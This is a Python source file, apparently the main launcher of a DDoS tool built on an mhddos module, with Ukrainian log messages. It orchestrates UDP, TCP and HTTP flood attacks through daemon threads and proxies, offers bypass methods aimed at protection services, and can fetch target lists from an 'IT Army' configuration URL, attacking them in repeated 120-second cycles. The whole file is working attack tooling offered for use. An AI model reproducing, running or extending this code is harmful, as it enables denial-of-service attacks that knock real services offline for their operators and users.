import queue
from collections import namedtuple
from concurrent.futures import Future
from concurrent.futures.thread import _WorkItem
from threading import Thread, Event
from time import sleep, time

import colorama
from yarl import URL

from src.cli import init_argparse
from src.core import logger, cl, UDP_THREADS, LOW_RPC, IT_ARMY_CONFIG_URL
from src.dns_utils import resolve_host, get_resolvable_targets
from src.mhddos import main as mhddos_main
from src.output import AtomicCounter, show_statistic, print_banner, print_progress
from src.proxies import update_proxies
from src.system import fix_ulimits
from src.targets import Targets


colorama.init()

Params = namedtuple('Params', 'url, ip, method, threads')

PAD_THREADS = 30

TERMINATE = object()


class DaemonThreadPool:
    def __init__(self):
        self._queue = queue.SimpleQueue()

    def start(self, num_threads):
        threads_started = num_threads
        for cnt in range(num_threads):
            try:
                Thread(target=self._worker, daemon=True).start()
            except RuntimeError:
                for _ in range(PAD_THREADS):
                    self._queue.put(TERMINATE)
                threads_started = cnt - PAD_THREADS
                if threads_started <= 0:
                    logger.warning(f'{cl.RED}Не вдалося запустити атаку - вичерпано ліміт потоків системи{cl.RESET}')
                    exit()
                logger.warning(
                    f'{cl.RED}Не вдалося запустити усі {num_threads} потоків - лише {threads_started}{cl.RESET}'
                )
                break
        return threads_started

    def submit(self, fn, *args, **kwargs):
        f = Future()
        w = _WorkItem(f, fn, args, kwargs)
        self._queue.put(w)
        return f

    def _worker(self):
        while True:
            work_item = self._queue.get(block=True)
            if work_item is TERMINATE:
                return

            if work_item is not None:
                work_item.run()
                del work_item


def run_ddos(thread_pool, proxies, targets, total_threads, period, rpc, http_methods, vpn_mode, debug, table):
    threads_per_target = total_threads // len(targets)
    params_list = []
    for target in targets:
        ip = resolve_host(target)
        target = URL(target)
        # UDP
        if target.scheme == 'udp':
            params_list.append(Params(target, ip, 'UDP', UDP_THREADS))

        # TCP
        elif target.scheme == 'tcp':
            params_list.append(Params(target, ip, 'TCP', threads_per_target))

        # HTTP(S)
        else:
            threads = threads_per_target // len(http_methods)
            for method in http_methods:
                params_list.append(Params(target, ip, method, threads))

    logger.info(f'{cl.YELLOW}Запускаємо атаку...{cl.RESET}')
    statistics = {}
    event = Event()
    event.set()
    for params in params_list:
        thread_statistics = {'requests': AtomicCounter(), 'bytes': AtomicCounter()}
        statistics[params] = thread_statistics
        kwargs = {
            **params._asdict(),
            'rpc': rpc,

            'thread_pool': thread_pool,
            'event': event,
            'statistics': thread_statistics,
            'proxies': proxies,
        }
        mhddos_main(**kwargs)
        if not table:
            logger.info(
                f"{cl.YELLOW}Атакуємо{cl.BLUE} %s{cl.YELLOW} методом{cl.BLUE} %s{cl.YELLOW}, потоків:{cl.BLUE} %d{cl.YELLOW}!{cl.RESET}"
                % (params.url.host, params.method, params.threads))

    if not (table or debug):
        print_progress(period, 0, len(proxies))
        sleep(period)
    else:
        ts = time()
        refresh_rate = 4 if table else 2
        sleep(refresh_rate)
        while True:
            passed = time() - ts
            if passed > period:
                break
            show_statistic(statistics, refresh_rate, table, vpn_mode, len(proxies), period, passed)
            sleep(refresh_rate)
    event.clear()


def start(args):
    print_banner(args.vpn_mode)
    fix_ulimits()

    if args.table:
        args.debug = False

    for bypass in ('CFB', 'DGB', 'BYPASS'):
        if bypass in args.http_methods:
            logger.warning(
                f'{cl.RED}Робота методу {bypass} не гарантована - атака методами '
                f'за замовчуванням може бути ефективніша{cl.RESET}'
            )

    thread_pool = DaemonThreadPool()
    total_threads = thread_pool.start(args.threads)  # It is possible that not all threads were started
    if args.itarmy:
        targets_iter = Targets([], IT_ARMY_CONFIG_URL)
    else:
        targets_iter = Targets(args.targets, args.config)

    while True:
        targets = list(get_resolvable_targets(targets_iter, thread_pool))
        if not targets:
            logger.error(f'{cl.RED}Не знайдено жодної доступної цілі{cl.RESET}')
            exit()

        if args.rpc < LOW_RPC:
            logger.warning(
                f'{cl.RED}RPC менше за {LOW_RPC}. Це може призвести до падіння продуктивності '
                f'через збільшення кількості перепідключень{cl.RESET}'
            )

        no_proxies = args.vpn_mode or all(target.lower().startswith('udp://') for target in targets)
        proxies = []
        if not no_proxies:
            proxies = update_proxies(args.proxies)

        period = 120
        run_ddos(
            thread_pool,
            proxies,
            targets,
            total_threads,
            period,
            args.rpc,
            args.http_methods,
            args.vpn_mode,
            args.debug,
            args.table
        )


if __name__ == '__main__':
    try:
        start(init_argparse().parse_args())
    except KeyboardInterrupt:
        logger.info(f'{cl.BLUE}Завершуємо роботу...{cl.RESET}')
